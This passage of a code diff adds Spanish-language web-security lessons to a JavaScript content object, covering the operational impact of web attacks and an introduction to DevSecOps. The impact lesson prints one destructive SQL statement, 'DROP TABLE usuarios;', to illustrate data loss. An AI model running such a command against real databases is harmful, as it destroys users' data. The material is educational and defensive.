+          <li>National Institute of Standards and Technology, Guide for Conducting Risk Assessments. [Online]. Available:
+            <a href="https://csrc.nist.gov" target="_blank">
+              https://csrc.nist.gov
+            </a>
+          </li>
+        </ul>
+    `
+    },
+    'impacto-operacional': {
+      id: 'impacto-operacional',
+      title: 'Impacto operativo de los ataques web',
+      description: 'Consecuencias reales de incidentes de seguridad en organizaciones.',
+      category: 'security-basics',
+      htmlContent: `
+        <p>
+          Los ataques contra aplicaciones web no solo comprometen datos, sino que afectan directamente la continuidad operativa de las organizaciones. Una aplicación comprometida puede perder disponibilidad, alterar su comportamiento, ser utilizada para actividades maliciosas o quedar inservible durante horas o días. El impacto operativo suele ser inmediato y puede extenderse a departamentos completos, proveedores, clientes y socios comerciales.
+        </p>
+
+        <p>
+          Cuando un atacante obtiene acceso a un servidor o a una aplicación crítica, la organización puede enfrentarse a interrupciones en servicios esenciales, pérdida de productividad, daño a infraestructura tecnológica y la necesidad de activar procedimientos de emergencia. A diferencia de un error funcional ordinario, un ataque exitoso no se limita a una zona del sistema, sino que puede desencadenar fallos en cadena que afectan múltiples componentes y procesos internos.
+        </p>
+
+        <p>
+          En muchos incidentes, el tiempo de recuperación es mayor que el tiempo de ataque. La identificación del daño, la restauración de sistemas, la validación de integridad y la reactivación de servicios involucran múltiples equipos técnicos. Durante este proceso, la empresa opera de manera parcial o incluso queda completamente suspendida. Esto demuestra que los ataques web no representan únicamente una amenaza técnica, sino un riesgo operativo de alto nivel.
+        </p>
+
+        <h2>Afectaciones en la disponibilidad del servicio</h2>
+
+        <p>
+          Una de las consecuencias más visibles de un ataque exitoso es la pérdida de disponibilidad. Cuando una aplicación deja de responder, los usuarios perciben de inmediato la falla, lo que afecta actividades comerciales, servicios internos o procesos automáticos dependientes del sistema.
+        </p>
+
+        <p>
+          Los ataques que provocan esta afectación incluyen desde inyecciones que rompen la lógica del servidor hasta sabotajes intencionales que alteran configuraciones críticas. Incluso una vulnerabilidad que permite la ejecución de una sola instrucción maliciosa puede dejar un sistema fuera de servicio.
+        </p>
+
+        <p>
+          Un ejemplo claro es la explotación de una vulnerabilidad que permite al atacante ejecutar código dentro del servidor. Si este código fuerza un reinicio continuo, elimina archivos necesarios o consume todos los recursos disponibles, la aplicación queda inutilizada. En entornos donde la disponibilidad es esencial, como sistemas de pago, portales de servicios públicos o plataformas educativas, estas interrupciones representan un impacto severo en la operación diaria.
+        </p>
+
+        <h2>Pérdida o alteración de datos críticos</h2>
+
+        <p>
+          Los ataques que permiten modificar o eliminar información suelen tener un impacto mucho más profundo que un simple error momentáneo. Cuando los datos son destruidos o manipulados, las operaciones que dependen de esa información también quedan comprometidas. Esto puede afectar registros de clientes, información financiera, historiales de actividad, configuraciones del sistema o cualquier otro elemento esencial para el funcionamiento de la aplicación.
+        </p>
+
+        <p>
+          Una vulnerabilidad que permite ejecutar consultas SQL sin control es suficiente para alterar registros clave o incluso borrar tablas completas. Una consulta maliciosa como:
+        </p>
+
+        <pre><code>DROP TABLE usuarios;</code></pre>
+
+        <p>
+          ilustra cómo un atacante puede interrumpir operaciones de forma inmediata. Además de la interrupción operativa, la pérdida de datos suele requerir restauraciones desde respaldos. Si estos respaldos no están actualizados, parte de la información puede perderse de forma permanente, lo que afecta informes, procesos administrativos o funciones críticas que dependan de datos recientes.
+        </p>
+
+        <p>
+          En casos donde los datos son modificados de manera silenciosa y no destruidos, el impacto puede ser aún más peligroso, ya que los sistemas continúan operando bajo información incorrecta, afectando decisiones, transacciones y reportes sin que se detecte el problema de inmediato.
+        </p>
+
+        <h2>Uso malicioso de infraestructura comprometida</h2>
+
+        <p>
+          Cuando un atacante obtiene control sobre recursos de la aplicación, estos pueden ser utilizados para actividades maliciosas que no están directamente relacionadas con la aplicación original, pero que generan un impacto operativo significativo. Los atacantes suelen aprovechar servidores comprometidos para enviar correos masivos fraudulentos, alojar contenido ilegal, distribuir malware o realizar ataques coordinados contra otros sistemas.
+        </p>
+
+        <p>
+          Un servidor comprometido también puede ser integrado en una red de equipos controlados de manera remota, conocida como botnet. En estos casos, el servidor afectado forma parte de operaciones más amplias sin el conocimiento del propietario, lo que puede generar sanciones, bloqueos de red, alertas de proveedores de servicio e incluso investigaciones legales.
+        </p>
+
+        <p>
+          Además, una infraestructura comprometida pierde su confiabilidad. Aun si no se percibe daño inmediato, el simple hecho de que un atacante tenga acceso implica que cualquier archivo, proceso o configuración puede haber sido alterada. Esto obliga a realizar auditorías exhaustivas y, en casos severos, reconstruir completamente el sistema.
+        </p>
+
+        <h2>Alteración de procesos internos y flujo de trabajo</h2>
+
+        <p>
+          Los ataques que comprometen la lógica de una aplicación suelen repercutir directamente en el flujo de trabajo de la organización. Cuando un atacante modifica permisos, roles, valores de parámetros o estados de procesos internos, la aplicación puede ejecutar acciones inapropiadas o permitir operaciones fuera de lugar. Esto altera la manera en que los empleados y sistemas automáticos interactúan con la plataforma.
+        </p>
+
+        <p>
+          Por ejemplo, si una vulnerabilidad permite a un atacante modificar privilegios de usuario, un empleado sin certificación puede obtener permisos administrativos y ejecutar acciones críticas. Asimismo, si se altera un proceso de aprobación o verificación, el sistema puede aceptar transacciones inválidas, solicitudes fraudulentas o cambios no autorizados que se propaguen a otros sistemas corporativos.
+        </p>
+
+        <p>
+          Estas alteraciones afectan directamente la calidad del servicio, el cumplimiento normativo y la integridad de los flujos internos, lo que convierte este tipo de ataque en una amenaza relevante incluso cuando no se produce una interrupción completa del sistema.
+        </p>
+
+        <h2>Interrupción de operaciones dependientes de terceros</h2>
+
+        <p>
+          Las aplicaciones modernas rara vez funcionan de manera aislada. La mayoría interactúa con servicios de terceros como plataformas de pago, sistemas de autenticación, servidores de correo, APIs externas o proveedores de almacenamiento. Cuando un ataque compromete la forma en que la aplicación consume estos servicios, el impacto se extiende más allá de la aplicación principal.
+        </p>
+
+        <p>
+          Si un atacante manipula solicitudes enviadas a un proveedor externo, puede generar fallos en cascada que afecten pagos, notificaciones, registros de auditoría o cualquier otro componente que deje de funcionar de manera adecuada. Esto no solo genera interrupciones, sino que ralentiza procesos internos y obliga a realizar revisiones manuales para determinar qué operaciones fueron procesadas correctamente y cuáles pudieron haber sido alteradas.
+        </p>
+
+        <h2>Daño reputacional y pérdida de confianza del usuario</h2>
+
+        <p>
+          Aunque el impacto técnico es considerable, uno de los efectos más duraderos de un ataque es la pérdida de confianza de los usuarios. Una aplicación que sufre una brecha o que permanece caída durante horas transmite una imagen de falta de seguridad y de control. La percepción pública es un componente esencial para organizaciones que manejan datos personales, servicios financieros o plataformas educativas.
+        </p>
+
+        <p>
+          Incluso cuando la empresa logra restaurar el servicio, el usuario puede tomar la decisión de no volver a utilizar la plataforma, especialmente si percibe riesgo para su información personal. Este impacto, aunque intangible, tiene repercusiones económicas, comerciales y operativas a largo plazo.
+        </p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>IBM Security, Cost of a Data Breach Report 2023. [Online]. Available:
+            <a href="https://www.ibm.com/reports/data-breach" target="_blank">
+              https://www.ibm.com/reports/data-breach
+            </a>
+          </li>
+
+          <li>OWASP Foundation, Web Security Testing Guide. [Online]. Available:
+            <a href="https://owasp.org/www-project-web-security-testing-guide" target="_blank">
+              https://owasp.org/www-project-web-security-testing-guide
+            </a>
+          </li>
+
+          <li>ENISA, Threat Landscape 2023. [Online]. Available:
+            <a href="https://www.enisa.europa.eu" target="_blank">
+              https://www.enisa.europa.eu
+            </a>
+          </li>
+
+          <li>Cybersecurity and Infrastructure Security Agency, Understanding Denial-of-Service Attacks. [Online]. Available:
+            <a href="https://www.cisa.gov" target="_blank">
+              https://www.cisa.gov
+            </a>
+          </li>
+
+          <li>M. Zalewski, <i>The Tangled Web: A Guide to Securing Modern Web Applications</i>. San Francisco, CA, USA: No Starch Press, 2012.</li>
+        </ul>
+    `
+    },
+    'ciclo-seguro-devsecops': {
+      id: 'ciclo-seguro-devsecops',
+      title: 'Introducción al ciclo seguro de desarrollo (DevSecOps)',
+      description: 'Metodologías integradas para el desarrollo seguro de software.',
+      category: 'security-basics',
+      htmlContent: `
+        <p>
+          El desarrollo moderno de software requiere integrar la seguridad desde el inicio del proyecto y no como una etapa aislada que ocurre después de la implementación. Este enfoque preventivo es fundamental para reducir vulnerabilidades, acortar tiempos de corrección y evitar costos elevados asociados a fallas detectadas en etapas tardías. La filosofía que impulsa este enfoque se conoce como DevSecOps, un modelo que combina prácticas de desarrollo, operaciones y seguridad en un único ciclo continuo.
+        </p>
+
+        <p>
+          DevSecOps asume que la seguridad es responsabilidad de todos los participantes del proyecto y que debe incorporarse de manera natural en cada fase del ciclo de vida del software. Desde la planificación inicial hasta el despliegue en producción, cada cambio, dependencia, configuración y línea de código debe considerar su impacto sobre la integridad, la confidencialidad y la disponibilidad del sistema. Esto evita que la seguridad dependa exclusivamente de auditorías posteriores y permite que las aplicaciones se construyan con mecanismos protectores desde su diseño.
+        </p>
+
+        <h2>Integración temprana de la seguridad</h2>
+
+        <p>
+          Una de las ideas centrales de DevSecOps es integrar prácticas de seguridad desde las primeras fases del ciclo de desarrollo. Esto implica revisar requisitos funcionales con criterios de seguridad, identificar activos críticos, establecer tolerancias de riesgo y anticipar posibles escenarios de ataque. Incorporar esta perspectiva temprana facilita la construcción de arquitecturas más robustas y reduce la probabilidad de que decisiones iniciales generen puntos de exposición difíciles de corregir más adelante.
+        </p>
+
+        <p>
+          Durante la etapa de diseño, los equipos analizan flujos de información, modelos de amenazas y dependencias externas para definir controles preventivos antes de escribir el código. Este enfoque permite incluir mecanismos como autenticación sólida, validación rigurosa de entradas, segmentación adecuada de privilegios y uso de componentes confiables antes de que la implementación avance. En contraste con enfoques tradicionales, DevSecOps evita tener que rediseñar estructuras completas cuando se detectan fallas demasiado tarde.
+        </p>
+
+        <h2>Automatización como pilar del ciclo seguro</h2>
+
+        <p>
+          La automatización es un elemento esencial en el enfoque DevSecOps. Integrar controles automatizados en la cadena de construcción y despliegue garantiza que cada cambio en el código sea evaluado con criterios de seguridad sin depender de intervención manual. Esta automatización puede incluir análisis estático de código, revisión de dependencias vulnerables, escaneo de contenedores, pruebas dinámicas y validación de configuraciones.
+        </p>
+
+        <p>
+          En una canalización de integración continua, cada vez que un desarrollador realiza un cambio, el sistema ejecuta automáticamente herramientas que identifican patrones peligrosos, librerías obsoletas o configuraciones incorrectas. Esto permite detectar problemas en cuestión de segundos y corregirlos antes de que lleguen a entornos más avanzados. La automatización elimina la repetitividad, incrementa la precisión y facilita que la seguridad se convierta en una práctica cotidiana dentro del proceso de desarrollo.
+        </p>
+
+        <p>
+          Un ejemplo claro es el uso de análisis estático de código. Cuando un cambio es enviado al repositorio, una herramienta de análisis puede detectar construcciones inseguras como concatenación de parámetros en consultas SQL, validaciones incompletas o uso de funciones peligrosas. De esta forma, el error se corrige antes de desplegar el código, reduciendo significativamente el riesgo de vulnerabilidades explotables.
+        </p>
+
+        <h2>Validación continua en todas las fases del ciclo</h2>
+
+        <p>
+          DevSecOps propone que la validación no sea un evento aislado, sino un proceso continuo. Esto implica ejecutar pruebas de seguridad en múltiples momentos del ciclo y en distintos niveles de profundidad. Las pruebas estáticas se realizan sobre el código antes de su ejecución, mientras que las pruebas dinámicas se ejecutan sobre la aplicación en funcionamiento. Ambas son complementarias y permiten identificar errores que no serían visibles de otra forma.
+        </p>
+
+        <p>
+          La validación continua también incluye escaneo de infraestructura, revisión de políticas de acceso, inspección de contenedores, análisis de configuraciones en la nube y monitoreo activo de comportamientos anómalos. Cada componente del sistema, desde la lógica interna hasta los servicios externos, debe evaluarse de manera periódica para detectar desviaciones respecto al estado esperado. Esta revisión frecuente permite reaccionar con rapidez ante cambios no autorizados o configuraciones que puedan poner en riesgo la plataforma.
+        </p>
+
+        <h2>Colaboración entre equipos y cultura de responsabilidad compartida</h2>
+
+        <p>
+          Un aspecto esencial del modelo DevSecOps es la colaboración constante entre los equipos de desarrollo, operaciones y seguridad. En lugar de que cada área funcione como una unidad aislada, DevSecOps fomenta la comunicación directa y el trabajo conjunto en todas las etapas del proyecto. Esta colaboración reduce fricciones, evita malentendidos técnicos y facilita la integración de controles de seguridad sin comprometer la velocidad de desarrollo.
+        </p>
+
+        <p>
+          La cultura DevSecOps promueve la idea de responsabilidad compartida. Cada miembro del equipo, independientemente de su rol, debe comprender que su trabajo tiene implicaciones en la seguridad del sistema. Esto implica que los desarrolladores adoptan patrones seguros de programación, los equipos de operaciones aplican configuraciones robustas y los especialistas en seguridad facilitan herramientas y guías que permitan desarrollar con confianza. El objetivo no es que todos los miembros se conviertan en expertos en seguridad, sino que integren prácticas que reduzcan riesgos de manera natural.
+        </p>
+
+        <h2>Monitoreo, retroalimentación y mejora continua</h2>
+
+        <p>
+          El monitoreo constante es un componente imprescindible dentro de DevSecOps. La aplicación y la infraestructura deben ser observadas en tiempo real para detectar comportamientos inesperados, intentos de ataque o fallos de configuración. Herramientas de monitoreo y registro permiten identificar patrones anómalos como múltiples intentos de inicio de sesión fallidos, variaciones inusuales en el tráfico o errores repetitivos que podrían indicar explotación activa.
+        </p>
+
+        <p>
+          El análisis posterior de estos eventos permite ajustar las políticas de seguridad, mejorar las configuraciones y optimizar los procesos de desarrollo. La mejora continua es una característica esencial del modelo, ya que el panorama de amenazas cambia constantemente. A medida que surgen nuevas técnicas de ataque o vulnerabilidades recientes en los componentes utilizados, la organización debe adaptar sus controles para mantener la protección del sistema.
+        </p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>OWASP Foundation, Software Assurance Maturity Model. [Online]. Available:
+            <a href="https://owasp.org/www-project-samm" target="_blank">
+              https://owasp.org/www-project-samm
+            </a>
+          </li>
+
+          <li>GitLab, DevSecOps Overview. [Online]. Available:
+            <a href="https://docs.gitlab.com" target="_blank">
+              https://docs.gitlab.com
+            </a>
+          </li>
+
+          <li>National Institute of Standards and Technology, Secure Software Development Framework. [Online]. Available:
+            <a href="https://csrc.nist.gov" target="_blank">
+              https://csrc.nist.gov
+            </a>
+          </li>
+
+          <li>Red Hat, Understanding DevSecOps. [Online]. Available:
+            <a href="https://www.redhat.com" target="_blank">
+              https://www.redhat.com
+            </a>
+          </li>
+
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>
+        </ul>
+    `
     }
   };
 
